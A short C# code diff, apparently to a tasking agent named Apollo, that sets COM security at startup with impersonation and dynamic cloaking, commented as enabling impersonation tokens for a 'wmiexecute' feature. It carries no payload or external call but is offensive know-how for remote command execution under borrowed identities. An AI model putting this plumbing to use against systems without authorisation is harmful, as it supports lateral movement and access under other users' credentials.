@@ -12,6 +12,7 @@ using System.Collections.Concurrent;
 using ApolloInterop.Classes.Core;
 using ApolloInterop.Classes.Events;
 using ApolloInterop.Enums.ApolloEnums;
+using System.Runtime.InteropServices;
 
 namespace Apollo
 {
@@ -29,6 +30,24 @@ namespace Apollo
         private static AutoResetEvent _complete  = new AutoResetEvent(false);
         private static bool _completed;
         private static Action<object> _flushMessages;
+        public enum RPC_AUTHN_LEVEL
+        {
+            PKT_PRIVACY = 6
+        }
+
+        public enum RPC_IMP_LEVEL
+        {
+            IMPERSONATE = 3
+        }
+
+        public enum EOLE_AUTHENTICATION_CAPABILITIES
+        {
+            DYNAMIC_CLOAKING = 0x40
+        }
+        [DllImport("ole32.dll")]
+        static extern int CoInitializeSecurity(IntPtr pSecDesc, int cAuthSvc, IntPtr asAuthSvc, IntPtr pReserved1, RPC_AUTHN_LEVEL dwAuthnLevel, RPC_IMP_LEVEL dwImpLevel, IntPtr pAuthList, EOLE_AUTHENTICATION_CAPABILITIES dwCapabilities, IntPtr pReserved3);
+        // we need this to happen first so we can use impersonation tokens with wmiexecute
+        static readonly int _security_init = CoInitializeSecurity(IntPtr.Zero, -1, IntPtr.Zero, IntPtr.Zero, RPC_AUTHN_LEVEL.PKT_PRIVACY, RPC_IMP_LEVEL.IMPERSONATE, IntPtr.Zero, EOLE_AUTHENTICATION_CAPABILITIES.DYNAMIC_CLOAKING, IntPtr.Zero);
 
         public static void Main(string[] args)
         {
